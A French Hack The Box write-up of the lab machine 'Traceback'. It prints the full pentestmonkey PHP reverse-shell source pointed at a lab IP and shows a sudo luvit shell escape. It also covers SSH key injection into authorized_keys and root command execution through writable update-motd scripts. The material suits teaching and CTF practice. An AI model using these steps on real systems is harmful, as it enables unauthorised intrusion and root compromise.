---
layout: post
title: HTB - Traceback
subtitle: Hack The Box - Linux Machine - Easy 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Linux, backdoor, Webshell, php, lua, luvit, PsPy, update-motod, SSH, authorized_keys]
comments: false
---

## 1. User

Nmap: port 80 et 22

Page web:

~~~
'This site has been owned
I have left a backdoor for all the net. FREE INTERNETZZZ
- Xh4H - '
~~~

Code source: 

~~~
(...) <!--Some of the best web shells that you might need ;)-->
~~~

Google: 'Some of the best web shells '

Premier résultat: [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells) 

On teste les shell un par un et on trouve une interface via l'url :

http://10.10.10.181/smevk.php

On regarde le code source [https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php) et on trouve que les credentials sont admin::admin, on se log au shell avec 

Le shell permet d'uploader des fichiers, on va utiliser php-reverse-shell de pentest monkey

Dans un shell de commande:

~~~
root@Host-001:~/Bureau# tar -xvf php-reverse-shell-1.0.tar.gz 
php-reverse-shell-1.0/
php-reverse-shell-1.0/COPYING.GPL
php-reverse-shell-1.0/COPYING.PHP-REVERSE-SHELL
php-reverse-shell-1.0/php-reverse-shell.php
php-reverse-shell-1.0/CHANGELOG
root@Host-001:~/Bureau# cd php-reverse-shell-1.0/
root@Host-001:~/Bureau/php-reverse-shell-1.0# ls
CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  php-reverse-shell.php
root@Host-001:~/Bureau/php-reverse-shell-1.0# cp php-reverse-shell.php 0xSs0rZ.php
root@Host-001:~/Bureau/php-reverse-shell-1.0# ls
0xSs0rZ.php  COPYING.GPL                php-reverse-shell.php
CHANGELOG    COPYING.PHP-REVERSE-SHELL
root@Host-001:~/Bureau/php-reverse-shell-1.0# vim 0xSs0rZ.php 
root@Host-001:~/Bureau/php-reverse-shell-1.0# cat 0xSs0rZ.php 
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.211';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
~~~

Uploader le fichier 0xSs0rZ.php

dans un shell lancer nc -v -n -l -p 1234

aller sur 10.10.10.181/0xSs0rZ.php

On a une connection avec le serveur en tant que user webadmin

~~~
root@Host-001:~# nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [10.10.14.211] from (UNKNOWN) [10.10.10.181] 39892
Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 02:32:02 up  2:26,  8 users,  load average: 0.05, 0.23, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sysadmin pts/0    10.10.14.194     00:53    1:38m  0.00s  0.00s -sh
sysadmin pts/1    10.10.14.245     02:06   20:58   1:08   1:08  ./pspy32s
sysadmin pts/3    10.10.14.194     00:26    1:39m  0.04s  0.04s bash -i
webadmin pts/4    10.10.14.194     00:11    1:41m  0.07s  0.07s -bash
sysadmin pts/5    10.10.15.58      00:26   59:20   0.55s  0.55s bash
sysadmin pts/6    10.10.15.58      00:55    1:36m  0.00s  0.00s -sh
webadmin pts/7    10.10.15.36      02:10    1.00s  0.37s  0.04s ./luvit
sysadmin pts/8    10.10.14.245     02:17    5.00s  0.11s  0.11s /bin/bash
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
$ cd /home
$ ls
sysadmin
webadmin
$ cd sysadmin
/bin/sh: 4: cd: can't cd to sysadmin
$ cd webadmin
$ ls
(...)
luvit
note.txt
~~~

Il y a une tonne de script lua laissé par d'autres attaquants :(

~~~
$ cat note.txt
- sysadmin -
I have left this tool to practice Lua. Contact me if you have any question.
~~~

Il faut donc créer un script lua pour obtenir un shell en tant que sysadmin. On verifie qu'on aura un acces au compte sysadmin avec sudo -l

~~~
$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/webadmin/luvit
$ 
~~~

luvit n'est pas protégé par un mdp et permet une elevation de privilege

Uploader un fichier permettant d'exécuter un shell bash (yo.lua) et le placer dans /home/webadmin

~~~
$ cat yo.lua
os.execute('/bin/sh')
$ sudo -u sysadmin /home/webadmin/luvit yo.lua
sh: turning off NDELAY mode
id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
cat /home/sysadmin/user.txt
c24349701ae38c33ffbf0cceb2c46020
~~~

Uploader PsPy grace au backdoor

~~~
$ chmod +x pspy64s
$ ./pspy64s
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
(...)
2020/03/15 09:27:45 CMD: UID=0    PID=10956  | /usr/sbin/sshd -D -R 
2020/03/15 09:27:45 CMD: UID=106  PID=10957  | sshd: [net]          
2020/03/15 09:27:45 CMD: UID=0    PID=10959  | run-parts --lsbsysinit /etc/update-motd.d 
2020/03/15 09:27:45 CMD: UID=0    PID=10958  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
~~~

On voit un appel à update-motod.d

~~~
webadmin@traceback:/etc$ cd update-motd.d
cd update-motd.d
webadmin@traceback:/etc/update-motd.d$ ls -la
ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Jul 29 00:30 00-header
-rwxrwxr-x  1 root sysadmin  982 Jul 29 00:30 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Jul 29 00:30 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Jul 29 00:30 80-esm
-rwxrwxr-x  1 root sysadmin  299 Jul 29 00:30 91-release-upgrade
webadmin@traceback:/etc/update-motd.d$ cat 00-header
cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
webadmin@traceback:/etc/update-motd.d$ 
~~~

les fichiers sont accessibles en écriture, ils alterent la banniere lors d'une connection ssh

Modifions la clé ssh pour pouvoir nous connecter a webadmin

~~~
root@Host-001:~/Bureau/htb# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Bureau/htb/traceback
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/Bureau/htb/traceback
Your public key has been saved in /root/Bureau/htb/traceback.pub
The key fingerprint is:
SHA256:6XyyICOqr4MTVvXgthetLhHOeJsJCwxSXXL51fY54Vc root@Host-001
The key's randomart image is:
+---[RSA 3072]----+
|   ...o.   .     |
|  . .=.   . o . E|
| .  o o... . o o.|
|o  . + o.o    = .|
|+ . = o S      o |
|.+ o * =         |
|o.o * O + .      |
|+. o B o +       |
|==.   . .        |
+----[SHA256]-----+
root@Host-001:~/Bureau/htb# ls
Admirer  Book  Cache    Fuse   servmon       Tabby      traceback.pub
Blunder  buff  Cascade  magic  SneakyMailer  traceback
root@Host-001:~/Bureau/htb# cat traceback.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDsgaUFHPKR6TQf7rXuPcaSXyujJaBUvFlPWCYDeVR5adR+bHOh508cgCn9HxC79hNCPtv1a+8uRdK/0Ana1GMa35F2ugEMtHzoAjQA3zdrDRu7GS1LL/VdGqa9PMn3jKOzV1FZJrrqxqfSMhOsLXMkFJatjiSAjV0tmd8AI16p7C8nIbFmVfVHp3sLyzeB3VN6dKtFpCiWmmrdMDv5Nta9Y2FCKL20vo+dQvpfZPSPn5SzZjbpv5ITiPUdaKB2e+E4dDihuFE/VubKEWM71ns5xUPRb3DB4o5NrH8iE68/5BBUu3OT9fmo6FTUg2WsJzTZOThQQrADRNISnY9zD642pUHuT33+3JHj9XTWyojl4QYQQKENvL+rY31eGtkrvQYBXIAOvZV9KL9CNVFQb9ix5V8vCGsrG8slOpW3RaIAyJ5tm+mnWPO+P23tsdQsOudYbQE1sNdQfN/zOEqMgcfZG/3g5REqqSOAA6w0xjoJThKpYtKUvUdk2vePWA0bGb8= root@Host-001
root@Host-001:~/Bureau/htb# 
~~~
coté serveur

~~~
webadmin@traceback:/home/webadmin/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDsgaUFHPKR6TQf7rXuPcaSXyujJaBUvFlPWCYDeVR5adR+bHOh508cgCn9HxC79hNCPtv1a+8uRdK/0Ana1GMa35F2ugEMtHzoAjQA3zdrDRu7GS1LL/VdGqa9PMn3jKOzV1FZJrrqxqfSMhOsLXMkFJatjiSAjV0tmd8AI16p7C8nIbFmVfVHp3sLyzeB3VN6dKtFpCiWmmrdMDv5Nta9Y2FCKL20vo+dQvpfZPSPn5SzZjbpv5ITiPUdaKB2e+E4dDihuFE/VubKEWM71ns5xUPRb3DB4o5NrH8iE68/5BBUu3OT9fmo6FTUg2WsJzTZOThQQrADRNISnY9zD642pUHuT33+3JHj9XTWyojl4QYQQKENvL+rY31eGtkrvQYBXIAOvZV9KL9CNVFQb9ix5V8vCGsrG8slOpW3RaIAyJ5tm+mnWPO+P23tsdQsOudYbQE1sNdQfN/zOEqMgcfZG/3g5REqqSOAA6w0xjoJThKpYtKUvUdk2vePWA0bGb8= root@Host-001" >> authorized_keys
<UvUdk2vePWA0bGb8= root@Host-001" >> authorized_keys
webadmin@traceback:/home/webadmin/.ssh$ 
~~~

Connection ssh:

~~~
root@Host-001:~/Bureau/htb# ssh -i traceback webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
webadmin@traceback:~$ 
~~~

On peut desormais se connecter via ssh, modifions 00-header

~~~
webadmin@traceback:/etc/update-motd.d$ ls -la
ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Jul 29 00:43 00-header
-rwxrwxr-x  1 root sysadmin  982 Jul 29 00:43 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Jul 29 00:43 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Jul 29 00:43 80-esm
-rwxrwxr-x  1 root sysadmin  299 Jul 29 00:43 91-release-upgrade
webadmin@traceback:/etc/update-motd.d$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/bash")'
<n /home/sysadmin/luvit -e 'os.execute("/bin/bash")'
sysadmin@traceback:/etc/update-motd.d$ echo "cat /root/root.txt" >> 00-header
echo "cat /root/root.txt" >> 00-header
sysadmin@traceback:/etc/update-motd.d$ 
~~~

Connectons via ssh a webadmin

~~~
root@Host-001:~/Bureau/htb# ssh -i traceback webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

ed46830c7348cb3fe80a0cae9f03259d


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jul 29 00:47:35 2020 from 10.10.14.49
webadmin@traceback:~$ 
~~~

**Poursuivez avec :** 

[- Oneliner Shells](https://0xss0rz.github.io/2020-05-10-Oneliner-shells/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
